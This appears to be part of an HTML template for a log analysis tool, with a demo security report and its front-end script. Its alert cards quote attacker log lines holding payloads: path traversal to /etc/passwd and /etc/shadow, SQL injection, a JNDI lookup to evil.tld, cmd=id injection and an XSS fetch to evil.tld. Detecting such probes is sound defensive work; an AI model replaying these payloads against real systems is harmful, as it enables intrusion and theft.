+<figure class="chart"><figcaption><span class="cap"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>Event timeline</span><span class="legend"><i class="k-fail"></i>failed<i class="k-ok"></i>accepted<i class="k-other"></i>other</span></figcaption><svg viewBox="0 0 100 96" preserveAspectRatio="none" role="img" aria-label="Event volume over time, peak 10 events per 5min"><g><title>08:00 - 2 events (0 failed, 0 accepted)</title><rect class="b-other" x="0.140" y="76.80" width="2.046" height="19.20" rx="0.15"/></g><g><title>08:05 - 1 events (0 failed, 0 accepted)</title><rect class="b-other" x="2.466" y="86.40" width="2.046" height="9.60" rx="0.15"/></g><g><title>08:30 - 1 events (0 failed, 0 accepted)</title><rect class="b-other" x="14.093" y="86.40" width="2.046" height="9.60" rx="0.15"/></g><g><title>08:40 - 1 events (0 failed, 0 accepted)</title><rect class="b-other" x="18.745" y="86.40" width="2.046" height="9.60" rx="0.15"/></g><g><title>09:00 - 1 events (0 failed, 0 accepted)</title><rect class="b-other" x="28.047" y="86.40" width="2.046" height="9.60" rx="0.15"/></g><g><title>09:10 - 10 events (2 failed, 0 accepted)</title><rect class="b-other" x="32.698" y="19.20" width="2.046" height="76.80" rx="0.15"/><rect class="b-fail" x="32.698" y="-0.00" width="2.046" height="19.20" rx="0.15"/></g><g><title>09:20 - 10 events (8 failed, 0 accepted)</title><rect class="b-other" x="37.349" y="76.80" width="2.046" height="19.20" rx="0.15"/><rect class="b-fail" x="37.349" y="-0.00" width="2.046" height="76.80" rx="0.15"/></g><g><title>09:30 - 1 events (0 failed, 0 accepted)</title><rect class="b-other" x="42.000" y="86.40" width="2.046" height="9.60" rx="0.15"/></g><g><title>09:50 - 1 events (0 failed, 0 accepted)</title><rect class="b-other" x="51.303" y="86.40" width="2.046" height="9.60" rx="0.15"/></g><g><title>10:00 - 1 events (0 failed, 0 accepted)</title><rect class="b-other" x="55.954" y="86.40" width="2.046" height="9.60" rx="0.15"/></g><g><title>10:15 - 1 events (0 failed, 0 accepted)</title><rect class="b-other" x="62.931" y="86.40" width="2.046" height="9.60" rx="0.15"/></g><g><title>10:30 - 1 events (0 failed, 0 accepted)</title><rect class="b-other" x="69.907" y="86.40" width="2.046" height="9.60" rx="0.15"/></g><g><title>11:00 - 1 events (0 failed, 0 accepted)</title><rect class="b-other" x="83.861" y="86.40" width="2.046" height="9.60" rx="0.15"/></g><g><title>11:30 - 1 events (0 failed, 0 accepted)</title><rect class="b-other" x="97.814" y="86.40" width="2.046" height="9.60" rx="0.15"/></g></svg><div class="axis"><span>Aug 11 08:00</span><span>1 bar = 5min</span><span>Aug 11 11:30</span></div><details class="datatable"><summary>Show the numbers</summary><div class="scroll"><table><thead><tr><th>Time</th><th>Failed</th><th>Accepted</th><th>Other</th><th>Total</th></tr></thead><tbody><tr><td class="mono">Aug 11 08:00</td><td>0</td><td>0</td><td>2</td><td>2</td></tr><tr><td class="mono">Aug 11 08:05</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td class="mono">Aug 11 08:30</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td class="mono">Aug 11 08:40</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td class="mono">Aug 11 09:00</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td class="mono">Aug 11 09:10</td><td>2</td><td>0</td><td>8</td><td>10</td></tr><tr><td class="mono">Aug 11 09:20</td><td>8</td><td>0</td><td>2</td><td>10</td></tr><tr><td class="mono">Aug 11 09:30</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td class="mono">Aug 11 09:50</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td class="mono">Aug 11 10:00</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td class="mono">Aug 11 10:15</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td class="mono">Aug 11 10:30</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td class="mono">Aug 11 11:00</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td class="mono">Aug 11 11:30</td><td>0</td><td>0</td><td>1</td><td>1</td></tr></tbody></table></div></details></figure>
+<div class="grid">
+<div class="col-main">
+<article class="card sev-High" data-sev="High" style="--i:0"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M13 2 3 14h9l-1 8 10-12h-9z"/></svg>High</span><h3>Web attack pattern: path traversal</h3></header><p>2 request(s) from 203.0.113.88 carry path traversal payloads. These are not typos in a URL, they are crafted probes. At least one returned a success status, so the target may have answered the probe - treat as a possible breach.</p><pre><code><mark>203.0.113.88</mark> - - [11/Aug/2026:09:23:02 +0000] &quot;GET /static/../../../etc/passwd HTTP/1.1&quot; <b>200</b> 2841 &quot;-&quot; &quot;sqlmap/1.7&quot;
+<mark>203.0.113.88</mark> - - [11/Aug/2026:09:23:09 +0000] &quot;GET /static/%2e%2e%2f%2e%2e%2fetc/shadow HTTP/1.1&quot; <b>403</b> 162 &quot;-&quot; &quot;sqlmap/1.7&quot;</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Block the source IPs at the WAF or edge</li><li>Check the application logs for what those requests returned</li><li>Patch or virtual-patch the endpoint being probed</li></ol></div><footer><span class="tag">203.0.113.88</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1190/" title="Open this technique on attack.mitre.org">T1190 Exploit Public-Facing Application</a></footer></article>
+<article class="card sev-Medium" data-sev="Medium" style="--i:1"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>Medium</span><h3>Event volume spike at 09:14</h3></header><p>10 events in a single minute against a typical 1. A sudden flood usually means a scan, a service failing in a loop, or someone generating noise to bury the events that matter.</p><pre><code>198.51.100.23 - - [11/Aug/2026:09:14:01 +0000] &quot;GET /.env HTTP/1.1&quot; <b>404</b> 153 &quot;-&quot; &quot;python-requests/2.31&quot;
+198.51.100.23 - - [11/Aug/2026:09:14:02 +0000] &quot;GET /.git/config HTTP/1.1&quot; <b>404</b> 153 &quot;-&quot; &quot;python-requests/2.31&quot;
+198.51.100.23 - - [11/Aug/2026:09:14:03 +0000] &quot;GET /wp-login.php HTTP/1.1&quot; <b>404</b> 153 &quot;-&quot; &quot;python-requests/2.31&quot;</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Identify what produced the spike (source IP, service, error text)</li><li>Compare the rate against a normal day for this host</li><li>Check for other alerts inside the same minute</li></ol></div><footer><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1499/" title="Open this technique on attack.mitre.org">T1499 Endpoint Denial of Service (possible)</a></footer></article>
+<article class="card sev-Medium" data-sev="Medium" style="--i:2"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 11h14v10H5zM8 11V7a4 4 0 018 0v4"/></svg>Medium</span><h3>Rejected request burst from 203.0.113.88</h3></header><p>7 rejected web requests from 203.0.113.88 inside one minute (8 in total). Normal clients do not collect that many 401/403 answers - something is walking the site.</p><pre><code><mark>203.0.113.88</mark> - - [11/Aug/2026:09:22:31 +0000] &quot;GET /shop/item?id=1&#x27; or &#x27;1&#x27;=&#x27;1 HTTP/1.1&quot; <b>403</b> 162 &quot;-&quot; &quot;sqlmap/1.7&quot;
+<mark>203.0.113.88</mark> - - [11/Aug/2026:09:22:34 +0000] &quot;GET /shop/item?id=1 union select null,version() HTTP/1.1&quot; <b>403</b> 162 &quot;-&quot; &quot;sqlmap/1.7&quot;
+<mark>203.0.113.88</mark> - - [11/Aug/2026:09:22:37 +0000] &quot;GET /shop/item?id=1 and sleep(5) HTTP/1.1&quot; <b>403</b> 162 &quot;-&quot; &quot;sqlmap/1.7&quot;</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Rate-limit or block 203.0.113.88</li><li>Confirm no login from this IP ever succeeded</li><li>Check that account lockout is switched on</li></ol></div><footer><span class="tag">203.0.113.88</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1110/001/" title="Open this technique on attack.mitre.org">T1110.001 Brute Force: Password Guessing</a></footer></article>
+<article class="card sev-Medium" data-sev="Medium" style="--i:3"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M13 2 3 14h9l-1 8 10-12h-9z"/></svg>Medium</span><h3>Web attack pattern: SQL injection</h3></header><p>4 request(s) from 203.0.113.88 carry SQL injection payloads. These are not typos in a URL, they are crafted probes. All appear to have been rejected.</p><pre><code><mark>203.0.113.88</mark> - - [11/Aug/2026:09:22:31 +0000] &quot;GET /shop/item?id=1&#x27; or &#x27;1&#x27;=&#x27;1 HTTP/1.1&quot; <b>403</b> 162 &quot;-&quot; &quot;sqlmap/1.7&quot;
+<mark>203.0.113.88</mark> - - [11/Aug/2026:09:22:34 +0000] &quot;GET /shop/item?id=1 union select null,version() HTTP/1.1&quot; <b>403</b> 162 &quot;-&quot; &quot;sqlmap/1.7&quot;
+<mark>203.0.113.88</mark> - - [11/Aug/2026:09:22:37 +0000] &quot;GET /shop/item?id=1 and sleep(5) HTTP/1.1&quot; <b>403</b> 162 &quot;-&quot; &quot;sqlmap/1.7&quot;</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Block the source IPs at the WAF or edge</li><li>Check the application logs for what those requests returned</li><li>Patch or virtual-patch the endpoint being probed</li></ol></div><footer><span class="tag">203.0.113.88</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1190/" title="Open this technique on attack.mitre.org">T1190 Exploit Public-Facing Application</a></footer></article>
+<article class="card sev-Medium" data-sev="Medium" style="--i:4"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M13 2 3 14h9l-1 8 10-12h-9z"/></svg>Medium</span><h3>Web attack pattern: command or template injection</h3></header><p>2 request(s) from 203.0.113.88 carry command or template injection payloads. These are not typos in a URL, they are crafted probes. All appear to have been rejected.</p><pre><code><mark>203.0.113.88</mark> - - [11/Aug/2026:09:23:44 +0000] &quot;POST /api/render HTTP/1.1&quot; <b>500</b> 512 &quot;-&quot; &quot;${jndi:ldap://evil.tld/a}&quot;
+<mark>203.0.113.88</mark> - - [11/Aug/2026:09:24:02 +0000] &quot;GET /cgi-bin/status?cmd=id HTTP/1.1&quot; <b>401</b> 188 &quot;-&quot; &quot;curl/8.4&quot;</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Block the source IPs at the WAF or edge</li><li>Check the application logs for what those requests returned</li><li>Patch or virtual-patch the endpoint being probed</li></ol></div><footer><span class="tag">203.0.113.88</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1190/" title="Open this technique on attack.mitre.org">T1190 Exploit Public-Facing Application</a></footer></article>
+<article class="card sev-Medium" data-sev="Medium" style="--i:5"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M13 2 3 14h9l-1 8 10-12h-9z"/></svg>Medium</span><h3>Web attack pattern: cross-site scripting</h3></header><p>2 request(s) from 203.0.113.88 carry cross-site scripting payloads. These are not typos in a URL, they are crafted probes. All appear to have been rejected.</p><pre><code><mark>203.0.113.88</mark> - - [11/Aug/2026:09:23:20 +0000] &quot;GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1&quot; <b>403</b> 162 &quot;-&quot; &quot;sqlmap/1.7&quot;
+<mark>203.0.113.88</mark> - - [11/Aug/2026:09:23:26 +0000] &quot;GET /profile?img=x onerror=fetch(&#x27;//evil.tld&#x27;) HTTP/1.1&quot; <b>403</b> 162 &quot;-&quot; &quot;sqlmap/1.7&quot;</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Block the source IPs at the WAF or edge</li><li>Check the application logs for what those requests returned</li><li>Patch or virtual-patch the endpoint being probed</li></ol></div><footer><span class="tag">203.0.113.88</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1190/" title="Open this technique on attack.mitre.org">T1190 Exploit Public-Facing Application</a></footer></article>
+<article class="card sev-Medium" data-sev="Medium" style="--i:6"><header><span class="sev"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M13 2 3 14h9l-1 8 10-12h-9z"/></svg>Medium</span><h3>Web attack pattern: sensitive path probing</h3></header><p>8 request(s) from 198.51.100.23 carry sensitive path probing payloads. These are not typos in a URL, they are crafted probes. All appear to have been rejected.</p><pre><code><mark>198.51.100.23</mark> - - [11/Aug/2026:09:14:01 +0000] &quot;GET /.env HTTP/1.1&quot; <b>404</b> 153 &quot;-&quot; &quot;python-requests/2.31&quot;
+<mark>198.51.100.23</mark> - - [11/Aug/2026:09:14:02 +0000] &quot;GET /.git/config HTTP/1.1&quot; <b>404</b> 153 &quot;-&quot; &quot;python-requests/2.31&quot;
+<mark>198.51.100.23</mark> - - [11/Aug/2026:09:14:03 +0000] &quot;GET /wp-login.php HTTP/1.1&quot; <b>404</b> 153 &quot;-&quot; &quot;python-requests/2.31&quot;</code></pre><div class="actions"><h4><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>Recommended actions</h4><ol><li>Block the source IPs at the WAF or edge</li><li>Check the application logs for what those requests returned</li><li>Patch or virtual-patch the endpoint being probed</li></ol></div><footer><span class="tag">198.51.100.23</span><a class="mitre" target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1595/003/" title="Open this technique on attack.mitre.org">T1595.003 Active Scanning: Wordlist Scanning</a></footer></article>
+</div>
+<aside class="side" aria-label="Summary and export"><div class="card gauge-card risk-high"><svg class="gauge" viewBox="0 0 120 74" role="img" aria-label="Risk score 100 of 100, level High"><path d="M14 62a46 46 0 0192 0" fill="none" stroke="var(--card-2)" stroke-width="11" stroke-linecap="round"/><path d="M14 62a46 46 0 0192 0" fill="none" stroke="currentColor" stroke-width="11" stroke-linecap="round" stroke-dasharray="144.5" stroke-dashoffset="0.0"/><text x="60" y="54" class="g-num">100</text><text x="60" y="70" class="g-lab">HIGH RISK</text></svg><div class="bars"><div class="brow"><span class="blab risk-high">High</span><span class="btrack"><i class="bfill sev-bg-High" style="width:14%"></i></span><b>1</b></div><div class="brow"><span class="blab risk-medium">Medium</span><span class="btrack"><i class="bfill sev-bg-Medium" style="width:86%"></i></span><b>6</b></div><div class="brow"><span class="blab risk-low">Low</span><span class="btrack"><i class="bfill sev-bg-Low" style="width:0%"></i></span><b>0</b></div></div></div><div class="card"><h3><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zM2 12h20M12 2a15 15 0 010 20 15 15 0 010-20z"/></svg>Top sources</h3><div class="scroll"><table class="mini"><thead><tr><th>IP</th><th>Ev</th><th>Fail</th><th></th></tr></thead><tbody><tr><td class="mono">198.51.100.23</td><td>10</td><td>2</td><td><span class="verdict bad"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M18 6 6 18M6 6l12 12"/></svg>flagged</span></td></tr><tr><td class="mono">203.0.113.88</td><td>10</td><td>8</td><td><span class="verdict bad"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M18 6 6 18M6 6l12 12"/></svg>flagged</span></td></tr><tr><td class="mono">10.0.0.31</td><td>7</td><td>0</td><td><span class="verdict good"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>ok</span></td></tr><tr><td class="mono">10.0.0.44</td><td>3</td><td>0</td><td><span class="verdict good"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>ok</span></td></tr><tr><td class="mono">10.0.0.51</td><td>1</td><td>0</td><td><span class="verdict good"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>ok</span></td></tr><tr><td class="mono">10.0.0.62</td><td>1</td><td>0</td><td><span class="verdict good"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>ok</span></td></tr><tr><td class="mono">10.0.0.58</td><td>1</td><td>0</td><td><span class="verdict good"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>ok</span></td></tr></tbody></table></div></div></aside>
+</div>
+</div>
+</main>
+
+<script>
+const $ = s => document.querySelector(s), $$ = s => [...document.querySelectorAll(s)];
+
+// opened straight from the file system: nothing can analyse anything ------
+if (location.protocol === 'file:') {
+  const m = $('main');
+  m.innerHTML = m.innerHTML.replace(/\{\{\w+\}\}/g, '');
+  m.insertAdjacentHTML('afterbegin', '<p class="note">This is the page template. ' +
+    'Start the app with <code>python logmind.py</code> and open the ' +
+    '<b>http://localhost:&hellip;</b> address it prints &mdash; the analysis runs there.</p>');
+}
+
+// theme ------------------------------------------------------------------
+const root = document.documentElement;
+const setTheme = t => { root.dataset.theme = t; localStorage.logmindTheme = t;
+  $('#themeLabel').textContent = t === 'dark' ? 'Light' : 'Dark'; };
+setTheme(localStorage.logmindTheme ||
+  (matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark'));
+$('#theme').onclick = () => setTheme(root.dataset.theme === 'dark' ? 'light' : 'dark');
+
+// staggered entry --------------------------------------------------------
+$$('.step, .demo').forEach((el, i) => el.style.setProperty('--i', i));
+
+// input ------------------------------------------------------------------
+const ta = $('#log'), panel = $('#panel');
+if (panel) {
+const load = file => { const r = new FileReader();
+  r.onload = e => { ta.value = e.target.result; ta.focus(); }; r.readAsText(file); };
+$('#file').onchange = e => e.target.files[0] && load(e.target.files[0]);
+$('#clear').onclick = () => { ta.value = ''; ta.focus(); };
+$('#demo').onchange = e => e.target.value &&
+  (location = '/demo?f=' + encodeURIComponent(e.target.value));
+ta.addEventListener('keydown', e => {
+  if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) panel.requestSubmit(); });
+['dragenter','dragover'].forEach(ev => panel.addEventListener(ev, e => {
+  e.preventDefault(); panel.classList.add('over'); }));
+['dragleave','drop'].forEach(ev => panel.addEventListener(ev, e => {
+  e.preventDefault(); panel.classList.remove('over'); }));
+panel.addEventListener('drop', e => e.dataTransfer.files[0] && load(e.dataTransfer.files[0]));
+// loading feedback: the round trip is server-side, so say something
+panel.addEventListener('submit', () => { const b = $('#go');
+  if (ta.value.trim()) { b.disabled = true;
+    b.innerHTML = '<span class="spin"></span> Analyzing&hellip;'; } });
+}
+
+// severity filter, deep-linked via the hash ------------------------------
+const applyFilter = want => {
+  $$('.chip').forEach(c => { const on = c.dataset.sev === want;
+    c.classList.toggle('on', on); c.setAttribute('aria-pressed', on); });
+  $$('.card[data-sev]').forEach(c => c.hidden = want !== 'All' && c.dataset.sev !== want);
+};
+$$('.chip').forEach(c => c.onclick = () => {
+  applyFilter(c.dataset.sev);
+  history.replaceState(null, '', c.dataset.sev === 'All' ? location.pathname
+    : '#sev=' + c.dataset.sev); });
+const fromHash = (location.hash.match(/sev=(High|Medium|Low)/) || [])[1];
+if (fromHash) applyFilter(fromHash);
+
+// land on the results after an analysis ----------------------------------
+const res = $('#results');
+if (res && !fromHash) { res.focus({preventScroll:true});
+  res.scrollIntoView({behavior: matchMedia('(prefers-reduced-motion:reduce)').matches
+    ? 'auto' : 'smooth', block:'start'}); }
+
+// export -----------------------------------------------------------------
+const raw = id => (document.getElementById(id) || {}).textContent;
+const flash = (btn, msg) => { const t = btn.innerHTML; btn.textContent = msg;
+  setTimeout(() => btn.innerHTML = t, 1400); };
+if ($('#copyMd')) $('#copyMd').onclick = e =>
+  navigator.clipboard.writeText(raw('reportMd'))
+    .then(() => flash(e.currentTarget, 'Copied'))
+    .catch(() => flash(e.currentTarget, 'Copy blocked'));
+if ($('#dlJson')) $('#dlJson').onclick = () => {
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob([raw('reportJson')], {type:'application/json'}));
+  a.download = 'logmind-report.json'; a.click(); URL.revokeObjectURL(a.href); };
+</script>
+</body>
+</html>
